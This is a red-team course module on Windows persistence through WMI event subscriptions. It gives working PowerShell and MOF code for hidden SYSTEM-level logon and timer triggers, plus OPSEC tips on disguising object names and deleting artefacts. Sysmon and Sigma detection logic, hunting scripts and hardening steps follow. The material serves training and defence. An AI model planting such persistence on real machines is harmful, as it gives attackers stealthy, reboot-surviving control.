---
title: "Advanced Persistence — WMI Event Subscriptions"
tags: [red-team, persistence, WMI, event-subscription, T1546.003, ATT&CK,
  detection, hardening, WBEM, MOF]
module: 08-RedTeam-03
day: 531
related_topics:
  - Practice Checkpoint Cloud and Container (Day 530)
  - LOLAD Living Off The Land (Day 518)
  - Advanced Evasion AV Bypass (Day 519)
  - COM Hijacking and DLL Hijacking (Day 532)
---

# Day 531 — Advanced Persistence: WMI Event Subscriptions

> "WMI subscriptions are the persistence technique that EDR vendors finally caught
> up to — but only after five years of adversaries living in it rent-free. The
> reason it lasted so long is that it executes entirely inside a legitimate Windows
> subsystem, leaves no file on disk if done correctly, and survives reboots by
> design. Understand it cold, because your blue team absolutely must detect it."
>
> — Ghost

---

## Goals

Understand the WMI architecture and how event subscriptions enable persistence.
Build a WMI subscription that executes a payload on every user logon.
Build a WMI subscription triggered by a time-based schedule.
Understand every artefact this technique leaves and write detection logic for it.

**Prerequisites:** Day 499 (domain dominance), Day 518 (LOLAD), PowerShell
fluency, Windows internals basics.
**Time budget:** 5 hours.

---

## Part 1 — WMI Architecture for Attackers

```
WMI (Windows Management Instrumentation) is a core Windows subsystem that
exposes system management information via a structured namespace.

Key components for persistence:

  WMI Repository:
    → %SystemRoot%\System32\wbem\Repository
    → Stores all WMI class definitions, instances, subscriptions
    → Persistent: survives reboots (binary database, OBJECTS.DATA)

  The three objects required for a persistent subscription:

    1. __EventFilter
       → Defines the TRIGGER — what event fires the subscription
       → Query language: WQL (WMI Query Language, SQL-like)
       → Example triggers:
           - User logon: SELECT * FROM __InstanceCreationEvent WITHIN 5
                         WHERE TargetInstance ISA "Win32_LogonSession"
           - Timer: SELECT * FROM __TimerEvent WHERE TimerID = 'MyTimer'
           - Process creation: SELECT * FROM __InstanceCreationEvent WITHIN 5
                               WHERE TargetInstance ISA "Win32_Process"

    2. __EventConsumer
       → Defines the ACTION — what happens when the filter fires
       → Consumer types:
           CommandLineEventConsumer  → Runs an arbitrary command line
           ActiveScriptEventConsumer → Runs VBScript or JScript
           LogFileEventConsumer      → Writes to a log file
           NTEventLogEventConsumer   → Writes to Windows Event Log
           SMTPEventConsumer         → Sends email
       → Most used by attackers: CommandLineEventConsumer

    3. __FilterToConsumerBinding
       → Links the filter to the consumer
       → Without this binding, neither object does anything

Persistence mechanism:
  Filter fires → Binding evaluated → Consumer executes → Payload runs
  All of this happens inside svchost.exe hosting the WMI service (winmgmt)
  Result: no new process parent visible in process tree at initial glance
```

### Why WMI Persistence Works

```
Traditional persistence locations defenders check:
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   → Checked
  HKCU\...\Run                                         → Checked
  Scheduled Tasks (%SystemRoot%\System32\Tasks)        → Checked
  Services (HKLM\SYSTEM\CurrentControlSet\Services)    → Checked

WMI Repository (%SystemRoot%\System32\wbem\Repository):
  → Not in every analyst's checklist (historically)
  → Not visible in standard autoruns tools unless specifically shown
  → No file on disk for the payload (if using ActiveScriptEventConsumer
    with inline script or CommandLineEventConsumer pointing to PowerShell -c)
  → Executes from the WMI service, not from a user-launched process

Limitations (why you need to know these):
  → EDRs now monitor __EventConsumer and __FilterToConsumerBinding creation
  → Microsoft-Windows-WMI-Activity/Operational event log (Event ID 5861)
    captures subscription creation
  → Sysmon Event ID 20 (WmiEventFilter), 21 (WmiEventConsumer), 
    22 (WmiEventConsumerToFilter) cover all three objects
```

---

## Part 2 — Building a WMI Persistence Subscription

### Method 1 — PowerShell (Preferred for Scripted Implants)

```powershell
# Step 1: Define the filter (trigger on user logon)
$FilterArgs = @{
    Name        = 'MsUpdate_Filter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query       = "SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                  "WHERE TargetInstance ISA 'Win32_LogonSession' " +
                  "AND TargetInstance.LogonType = 2"
}
$Filter = Set-WmiInstance -Namespace root\subscription `
          -Class __EventFilter -Arguments $FilterArgs

# Step 2: Define the consumer (execute payload)
$ConsumerArgs = @{
    Name                = 'MsUpdate_Consumer'
    CommandLineTemplate = 'powershell.exe -NoP -W Hidden -NonI ' +
                          '-EncodedCommand <BASE64_ENCODED_PAYLOAD>'
}
$Consumer = Set-WmiInstance -Namespace root\subscription `
            -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Step 3: Bind filter to consumer
$BindingArgs = @{
    Filter   = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription `
    -Class __FilterToConsumerBinding -Arguments $BindingArgs

# Verify subscription was created
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### Method 2 — MOF File (Stealthier Registration Path)

```
// malicious_persist.mof
// Compile with: mofcomp.exe malicious_persist.mof
// After compilation the .mof file is no longer needed

#pragma namespace ("\\\\.\\root\\subscription")

instance of __EventFilter as $Filter
{
    Name = "WindowsUpdate_Filter";
    EventNamespace = "Root\\Cimv2";
    Query = "Select * From __InstanceCreationEvent "
            "Within 5 Where TargetInstance Isa "
            "\"Win32_LogonSession\"";
    QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as $Consumer
{
    Name = "WindowsUpdate_Consumer";
    CommandLineTemplate =
        "powershell.exe -NoP -W Hidden -NonI -c \"IEX([Text.Encoding]::Unicode"
        ".GetString([Convert]::FromBase64String('<B64>')))\"";
};

instance of __FilterToConsumerBinding
{
    Filter  = $Filter;
    Consumer = $Consumer;
};
```

```
Compile on target:
  mofcomp.exe malicious_persist.mof

OPSEC note:
  mofcomp.exe is a legitimate Windows binary (LOLBIN)
  The resulting subscription lives in the WMI repository
  Delete the .mof file after compilation — no persistent file artefact
```

### Method 3 — Timer-Based (Scheduled Polling, No Logon Dependency)

```powershell
# Create an __IntervalTimerInstruction that fires every 30 minutes
$TimerArgs = @{
    Name           = 'UpdateCheck_Timer'
    IntervalBetweenEvents = 1800000  # milliseconds (30 min)
    TimerID        = 'UpdateCheck'
}
Set-WmiInstance -Namespace root\cimv2 `
    -Class __IntervalTimerInstruction -Arguments $TimerArgs

# Filter references the timer
$FilterArgs = @{
    Name        = 'UpdateCheck_Filter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query       = "SELECT * FROM __TimerEvent WHERE TimerID='UpdateCheck'"
}
$Filter = Set-WmiInstance -Namespace root\subscription `
          -Class __EventFilter -Arguments $FilterArgs

# Consumer (same as Method 1 — arbitrary command)
```

---

## Part 3 — OPSEC Considerations for WMI Persistence

```
Naming:
  Bad:  "EvilPersistence", "Backdoor_Filter"
  Good: "WindowsDefender_Monitor", "UpdateScheduler_Filter",
        "MicrosoftEdge_EventConsumer"
  → Match Microsoft naming conventions for legitimate WMI subscriptions
  → Check existing subscriptions before naming:
    Get-WmiObject -Namespace root\subscription -Class __EventFilter |
        Select Name

Payload placement:
  Option A: Inline PowerShell (no file on disk)
    → CommandLineTemplate = "powershell.exe -EncodedCommand <B64>"
    → B64 payload is stored in WMI repository (still an artefact)
  Option B: Fileless via registry staging
    → Store payload in HKCU\Software\Microsoft\Windows\CurrentVersion
    → CommandLineTemplate reads and executes from registry via PowerShell
    → Two artefacts but harder to attribute: registry + WMI subscription
  Option C: Living-off-the-land delivery
    → Use msiexec.exe, wscript.exe, or cscript.exe as the consumer
    → References a file-less payload delivered via another channel

Execution context:
  → CommandLineEventConsumer executes as SYSTEM
  → This is already elevated — no privilege escalation required
  → Implant runs with highest privileges from the WMI service

Cleanup:
  Remove-WmiObject -Namespace root\subscription -Class __EventFilter `
      -Filter "Name='WindowsUpdate_Filter'"
  Remove-WmiObject -Namespace root\subscription -Class __EventConsumer `
      -Filter "Name='WindowsUpdate_Consumer'"
  Remove-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

---

## Part 4 — Detecting WMI Persistence

### Sysmon Detection (Recommended Config)

```xml
<!-- sysmon config — Event IDs 19, 20, 21 -->
<WmiEvent onmatch="include">
  <Operation condition="is">created</Operation>
</WmiEvent>
```

```
Sysmon Event ID 19 — WmiEventFilter activity detected
  → Logs when a __EventFilter is created
  → Key fields: EventNamespace, Name, Query

Sysmon Event ID 20 — WmiEventConsumer activity detected
  → Logs when a __EventConsumer is created
  → Key fields: Name, Type (CommandLineEventConsumer, etc.), Destination

Sysmon Event ID 21 — WmiEventConsumerToFilter activity detected
  → Logs when a __FilterToConsumerBinding is created
  → Key fields: Consumer, Filter

ATT&CK T1546.003 detection workflow:
  1. Any Event ID 19 with a WQL query matching logon/process events → HIGH
  2. Any Event ID 20 with a CommandLineEventConsumer pointing to
     powershell.exe, cmd.exe, wscript.exe, mshta.exe, rundll32.exe → HIGH
  3. Event ID 21 binding a suspicious filter to a suspicious consumer → CRITICAL
```

### Windows Event Log (Built-In, No Sysmon Required)

```
Log: Microsoft-Windows-WMI-Activity/Operational
Event ID 5861: A WMI subscription event was delivered

  Key fields:
    SUBSCRIPTION — the full WMI object path
    PossibleCause — the CommandLineTemplate or script content
    HostProcess — which process delivered the subscription event

Sigma rule concept:
  logsource:
    product: windows
    service: wmi
  detection:
    selection:
      EventID: 5861
      PossibleCause|contains:
        - 'powershell'
        - 'cmd.exe'
        - 'wscript'
        - 'mshta'
        - 'EncodedCommand'
        - 'IEX'
    condition: selection
```

### Hunting WMI Persistence (Blue Team)

```powershell
# Hunt for non-Microsoft WMI subscriptions
# Any subscription not created by Windows itself is suspicious

Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -notmatch 'SCM|BVTFilter|TSLogonEvents' } |
    Select-Object Name, Query, EventNamespace

Get-WmiObject -Namespace root\subscription -Class __EventConsumer |
    Where-Object { $_.Name -notmatch 'SCM' } |
    Select-Object Name, CommandLineTemplate, ScriptText

# The SCM* filters are created by Windows itself (Service Control Manager)
# Everything else is suspicious until proven legitimate

# Check WMI repository for recent modifications
$repo = "$env:SystemRoot\System32\wbem\Repository"
Get-ChildItem $repo -Recurse |
    Sort-Object LastWriteTime -Descending | Select-Object -First 10
```

---

## Part 5 — Hardening Against WMI Persistence

```
1. Enable Sysmon with WmiEvent events (IDs 19/20/21)
   → Deploy across all endpoints
   → Alert on any CommandLineEventConsumer creation

2. Enable Microsoft-Windows-WMI-Activity/Operational log
   → Default: disabled in most environments
   → Enable via: wevtutil sl Microsoft-Windows-WMI-Activity/Operational /e:true

3. Restrict WMI namespace access
   → wmimgmt.msc → Root\subscription → Security
   → Remove "Everyone" and "NETWORK" from subscription namespace
   → Only SYSTEM and Administrators should have write access

4. Audit and baseline existing subscriptions
   → Document all legitimate subscriptions in your environment
   → Alert on any new subscription (allowlist approach)

5. Block mofcomp.exe via AppLocker/WDAC for non-admin users
   → mofcomp.exe is the primary registration binary for MOF-based persistence
   → Blocking it forces the attacker to use PowerShell (easier to detect)
```

---

## Exercises

1. Build a WMI subscription in a lab Windows VM that runs a benign command
   (e.g., `notepad.exe`) on every user logon. Verify Sysmon captures Events 19,
   20, and 21. Remove the subscription and verify removal.
2. Build a timer-based WMI subscription that writes a timestamp to a file every
   5 minutes. Confirm execution occurs after system restart.
3. Write a PowerShell script that hunts for all non-default WMI subscriptions on
   a Windows system and flags any CommandLineEventConsumer referencing
   PowerShell, cmd.exe, or script interpreters.
4. Enable the WMI-Activity/Operational log and reproduce your subscription
   creation. Capture Event ID 5861 and verify the PossibleCause field contains
   your command.
5. Write the Sigma rule that would alert on the exact subscription you created
   in Exercise 1.

---

## Key Takeaways

1. WMI persistence operates entirely within a legitimate Windows subsystem
   and survives reboots by design. The payload lives in the WMI repository,
   not the filesystem — traditional file-based scanning misses it.
2. Three objects are required: __EventFilter (trigger), __EventConsumer
   (action), and __FilterToConsumerBinding (link). All three must be present
   for the subscription to execute.
3. CommandLineEventConsumer executes as SYSTEM, giving the implant the highest
   privilege level immediately upon trigger without any further escalation.
4. Sysmon Event IDs 19, 20, and 21 are the primary detection mechanism. Any
   environment without these events in their SIEM has a blind spot for this
   entire technique class.
5. Naming your WMI objects to mimic legitimate Microsoft subscriptions (e.g.,
   "SCM_", "WindowsUpdate_", "MicrosoftEdge_") delays detection by analysts
   doing manual review but will not defeat signature-based detection on the
   content of the CommandLineTemplate.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q531.1, Q531.2 …).

---

## Navigation

← Previous: [Day 530 — Practice Checkpoint: Cloud and Container](DAY-0530-Practice-Checkpoint-Cloud-Container.md)
→ Next: [Day 532 — COM Hijacking and DLL Hijacking](DAY-0532-COM-Hijacking-and-DLL-Hijacking.md)
